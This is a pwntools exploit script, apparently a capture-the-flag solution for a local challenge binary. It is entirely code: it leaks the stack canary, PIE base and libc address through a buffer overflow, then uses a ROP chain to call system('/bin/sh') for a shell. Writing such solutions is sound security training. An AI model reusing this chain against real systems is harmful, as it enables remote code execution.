#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 ../players/chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../static/chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc-2.31.so')

io = start()

io.sendafter(b"What's your name?\n", flat({0x108: b'~'}))
io.recvuntil(b'~')
canary = unpack((b'\0' + io.recvuntil(b'!\n', drop=True))[0:8])
io.info("CANARY : " + hex(canary))

io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: b'\xa3'}))

io.sendafter(b"What's your name?\n", flat({0x117: b'~'}))
io.recvuntil(b'~')
exe.address = unpack(io.recvuntil(b'!\n', drop=True).ljust(8, b'\0')) - 0x000012e2
io.info("EXE : " + hex(exe.address))

rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.main()
io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: rop.chain()}))
io.recvuntil(b'!\n')
libc.address = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - libc.sym['puts']
io.info("LIBC : " + hex(libc.address))

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
io.sendlineafter(b"What's your name?\n", b"")
io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: rop.chain()}))

io.interactive()
